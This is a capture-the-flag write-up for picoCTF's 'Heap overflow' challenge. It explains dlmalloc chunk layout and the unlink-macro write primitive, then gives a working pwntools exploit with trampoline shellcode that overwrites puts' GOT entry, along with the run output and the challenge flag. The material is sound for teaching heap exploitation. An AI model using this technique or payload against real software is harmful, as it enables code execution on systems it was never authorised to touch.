# Heap overflow
Binary Exploitation, 450 points

## Description:
> Just pwn this using a heap overflow taking advantage of douglas malloc free program and get a flag.

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define FLAGSIZE 128

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  fgets(buf,FLAGSIZE,f);
  fprintf(stdout,"%s\n",buf);
  fflush(stdout);
}

int main(int argc, char *argv[])
{
   char *fullname, *name, *lastname;
   fullname = malloc(666);
   name = malloc(66);
   lastname = malloc(66);
   printf("Oops! a new developer copy pasted and printed an address as a decimal...\n");
   printf("%d\n",fullname);
   printf("Input fullname\n");
   gets(fullname);
   printf("Input lastname\n");
   gets(lastname);
   free(fullname);
   puts("That is all...\n");
   free(name);
   free(lastname);
   exit(0);
}
```

Hints:

* https://www.win.tue.nl/~aeb/linux/hh/hh-11.html

## Solution:

This is an artificial example taken from [Secure Coding in C and C++](https://www.amazon.com/Secure-Coding-2nd-Software-Engineering/dp/0321822137). A complete analysis of the example exists in the book (section 4.6, Doug Lea's Memory Allocator, a.k.a. `dlmalloc`), and this writeup is inspired by it. 

The vulnerability here is a classic *heap overflow*, caused by an unbound read to a heap buffer: `gets(fullname)`.

Using this vulnerability, it is possible to write a DWORD to an arbitrary memory location. In order to understand how this is done, we need to understand the `dlmalloc` heap.

In this heap implementation, the heap is divided into chunks. When a user calls `malloc`, the heap manager allocates a chunk and returns it to the user. However, the address that `malloc` returns isn't the beginning of the chunk - there is some metadata before it. 

This is how a heap chunk looks like when it is allocated:

```
                                +------------------------+---+
                                | Size of chunk          | P |
Pointer returned by malloc -->  +------------------------+---+
                                | User Data                  |
                                |                            |
                                |                            |
                                |                            |
                                |                            |
                                +----------------------------+
```

The size of the chunk is saved in the DWORD before the address which is returned to the user, or in 31 bits of that DWORD, to be precise. Since chunk sizes are always a multiple of 2, the least significant bit (marked as `P` for `PREV_INUSE`) is used to indicates whether the previous chunk is in use or not.

When this chunk is freed by the user, it is inserted into a "bin" which holds multiple free chunks with similar attributes (e.g. a bin for small chunks, medium chunks, large chunks).
Each bin is implemented as a doubly linked list. As a free chunk, the chunk structure changes:
```
                                +------------------------+---+
                                | Size of chunk          | P |
Pointer returned by malloc -->  +------------------------+---+
                                | Forward Pointer            |
                                +----------------------------+
                                | Back Pointer               |
                                +----------------------------+
                                | Unused                     |
                                |                            |
                                +----------------------------+
                                | Size of chunk              |
                                +----------------------------+
```

Instead of the first two DWORDs of the user data, forward and back pointers related to the appropriate bin's doubly linked list are saved. The forward pointer points to the next free chunk in the bin, and the back pointer points to the previous free chunk in the bin (not to be confused with the previous chunk which `PREV_INUSE` refers to - that's just the chunk who happens to be adjacent to this one in memory).

Here's an illustration of the different states of the chunk, side by size:

```
                                           Allocated                       Free
                                +------------------------+---+  +------------------------+---+
                                | Size of chunk          | P |  | Size of chunk          | P |
Pointer returned by malloc -->  +------------------------+---+  +------------------------+---+
                                | User Data                  |  | Forward Pointer            |
                                +                            +  +----------------------------+
                                |                            |  | Back Pointer               |
                                +                            +  +----------------------------+
                                |                            |  | Unused                     |
                                |                            |  |                            |
                                +                            +  +----------------------------+
                                |                            |  | Size of chunk              |
                                +----------------------------+  +----------------------------+
```

Now, memory is freed via `free`, the heap manager also tries to consolidate adjacent in order to create a single large chunk and avoid memory fragmentation. This means that if the chunk located before the current chunk is free, the heap manager will merge both of them together. Then, if the chunk located after the current chunk is free, the heap manager will merge them too. In case the current chunk is merged with an adjacent chunk, the adjacent chunk needs to be removed from the bin it was in.

The code that's used to remove a chunk from its bin is implemented as a macro called `unlink`:
```c
#define unlink(P, BK, FD) { \
    FD = P->fd;  \
    BK = P->bk;  \
    FD->bk = BK; \
    BK->fd = FD; \
}
```

This is pretty standard code for removing an element from a doubly-linked list.

What happens when there's a buffer overflow on the heap? In this case, the attacker is able to overwrite some metadata from the next chunk. When the current chunk is freed, the malicious metadata will be used to trick the heap manager into performing unintended actions.

Let's walk through the attack with our example.

The program allocates three buffers: 
```c
   fullname = malloc(666);
   name = malloc(66);
   lastname = malloc(66);
```

Here's how the heap looks like after the allocations are done:
```
---------------+------------------------+---+ 
               | 672                    | P | 
firstname -->  +------------------------+---+ --+
               | User Data                  |   |
               +                            +   |
               |                            |   |
               +                            +   | 666 bytes
               |                            |   |
               |                            |   |
               +                            +   |
               |                            | --+
---------------+------------------------+---+
               | 72                     | 1 | 
name ------->  +------------------------+---+ --+
               | User Data                  |   |
               +                            +   |
               |                            |   |
               +                            +   | 66 bytes
               |                            |   |
               |                            |   |
               +                            +   |
               |                            | --+
---------------+------------------------+---+ 
               | 72                     | 1 | 
lastname --->  +------------------------+---+ --+
               | User Data                  |   |
               +                            +   |
               |                            |   | 
               +                            +   | 66 bytes
               |                            |   |
               |                            |   |
               +                            +   |
               |                            | --+
---------------+----------------------------+ 
```

The sizes are a result of taking the size that the user requested, adding 4 for the size DWORD itself and rounding up to the next multiple of 8 bytes.

The payload we'll be sending as input for `gets(fullname)` will be as follows:

```python
shell_code = asm('jmp l1; nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop; l1: push {}; ret;'.format(hex(exe.symbols["win"])))
payload = shell_code + ('B' * (664-len(shell_code))) + p32(100, sign = "signed") + p32(-4, sign = "signed") + p32(exe.got["puts"] - 12) + p32(address)
```

This will cause the heap to look as follows:
```
---------------+------------------------+---+ 
               | 672                    | P | 
firstname -->  +------------------------+---+ --+
               | shellcode + filler         |   |
               +                            +   |
               |                            |   |
               +                            +   | 666 bytes
               |                            |   |
               |                            |   |
               +----------------------------+   |
               | 100                    | 0 | --+
---------------+------------------------+---+
               | -4                     | 0 | 
name ------->  +------------------------+---+ --+
               | exe.got["puts"] - 12       |   |
               +----------------------------+   |
               | address of firstname       |   |
               +----------------------------+   | 66 bytes
               |                            |   |
               |                            |   |
               +                            +   |
               |                            | --+
---------------+------------------------+---+ 
               | 72                     | 1 | 
lastname --->  +------------------------+---+ --+
               | User Data                  |   |
               +                            +   |
               |                            |   | 
               +                            +   | 66 bytes
               |                            |   |
               |                            |   |
               +                            +   |
               |                            | --+
---------------+----------------------------+ 
```

Now, `free` is called on `firstname`. The heap manager wants to check if the chunk following `firstname` is in use. If it isn't, they will both be merged. So, the heap manager goes one DWORD backwards, and reads the size of the current chunk (672). It then jumps over the current chunk (chunk #1) to arrive to the metadata DWORD of the next chunk (chunk #2):

```
+------------------------+---+
| -4                     | 0 | 
+------------------------+---+
```

The heap manager needs to know if this chunk (chunk #2) is in use. It therefore must **jump over** this chunk (chunk #2) and arrive to **the chunk after it** (chunk #3). Remember that the `PREV_INUSE` bit of our current location refers to chunk #1, and the information about chunk #2 is located in the chunk after it, chunk #3.

So, the heap manager takes the address of chunk #2, adds the size of the chunk (-4 due to our attack) and jumps to that location:

```
+----------------------------+
| 100                    | 0 |
+------------------------+---+
```

The size in the chunk doesn't really matter, what matters is that the malicious payload made sure that the number is even, i.e. `PREV_INUSE` = 0. (Sometimes it is recommended to send `-4` as well, since this number is even, has no NULL bytes and is interpreted as a large unsigned int which ensures that no `fastbin`-related logic will be involved).
The fact that `PREV_INUSE` = 0 means that the heap manager can merge both chunks safely. As a result, chunk #2 needs to be removed from its current bin. `unlink` is called on chunk #2. Let's see how it behaves:

```c
FD = P->fd;  // FD points to (exe.got["puts"] - 12), since that's the value we overran the buffer with
BK = P->bk;  // BK points to (address of firstname), since that's the value we overran the buffer with
FD->bk = BK; // (exe.got["puts"] - 12) + 12 = (address of firstname); We wrote an arbitrary DWORD to an arbitrary location
BK->fd = FD; // (address of firstname) + 8 = (exe.got["puts"] - 12); Side effect
```

The `unlink` macro allowed us to overwrite the .got.plt address of `puts` with the address of our shellcode. Notice that as a side-effect, some of the shellcode was overwritten. That's the reason the shellcode needs to be built as a "trampoline":

```python
shell_code = asm('jmp l1; nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop; l1: push {}; ret;'.format(hex(exe.symbols["win"])))
```

The first few bytes don't get overwritten, and they allow us to jump over the `nop` area, which will be destroyed, straight to the real shellcode which in our case just calls `win`.

Now, when `puts` gets called, our shellcode is executed and we get the flag.


```python
# First, generate a pwntools template using:
# pwn template --host 2019shell1.picoctf.com --user dvdalt --path /problems/heap-overflow_2_de0f6daa62288c9b3afb950888dc7166/vuln

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments

import os

if shell is not None:
    shell.set_working_directory(os.path.dirname(remote_path))

io = start()

io.recvuntil("Oops! a new developer copy pasted and printed an address as a decimal...\n")
address = int(io.recvline())

log.info("Address of fullname: {}".format(hex(address)))
log.info("Address of win(): {}".format(hex(exe.symbols["win"])))

shellcode = asm('jmp l1; nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop; l1: push {}; ret;'.format(hex(exe.symbols["win"])))
log.info("shellcode:\n{}".format(hexdump(shellcode)))

payload = shellcode + ('B' * (664-len(shellcode))) + p32(100, sign = "signed") + p32(-4, sign = "signed") + p32(exe.got["puts"] - 12) + p32(address)
log.info("payload:\n{}".format(hexdump(payload)))

io.sendlineafter("Input fullname", payload)
io.sendlineafter("Input lastname", "a")

print io.recvall()
```

Output:
```console
root@kali:/media/sf_CTFs/pico/Heap_overflow# python exploit.py
[*] '/media/sf_CTFs/pico/Heap_overflow/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Connecting to 2019shell1.picoctf.com on port 22: Done
[*] dvdalt@2019shell1.picoctf.com:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Opening new channel: 'pwd': Done
[+] Receiving all data: Done (13B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/tmp/tmp.79dCV2wlSk'
[+] Opening new channel: 'ln -s /home/dvdalt/* .': Done
[+] Receiving all data: Done (0B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/problems/heap-overflow_2_de0f6daa62288c9b3afb950888dc7166'
[+] Starting remote process '/problems/heap-overflow_2_de0f6daa62288c9b3afb950888dc7166/vuln' on 2019shell1.picoctf.com:
 pid 3532938
[*] Address of fullname: 0x99e9008
[*] Address of win(): 0x8048936
[*] shellcode:
    00000000  eb 0c 90 90  90 90 90 90  90 90 90 90  90 90 68 36  │····│····│····│··h6│
    00000010  89 04 08 c3                                         │····││
    00000014
[*] payload:
    00000000  eb 0c 90 90  90 90 90 90  90 90 90 90  90 90 68 36  │····│····│····│··h6│
    00000010  89 04 08 c3  42 42 42 42  42 42 42 42  42 42 42 42  │····│BBBB│BBBB│BBBB│
    00000020  42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  │BBBB│BBBB│BBBB│BBBB│
    *
    00000290  42 42 42 42  42 42 42 42  64 00 00 00  fc ff ff ff  │BBBB│BBBB│d···│····│
    000002a0  1c d0 04 08  08 90 9e 09                            │····│····││
    000002a8
[+] Receiving all data: Done (33B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 3532938)

picoCTF{a_s1mpl3_h3ap_5e4b54d4}
```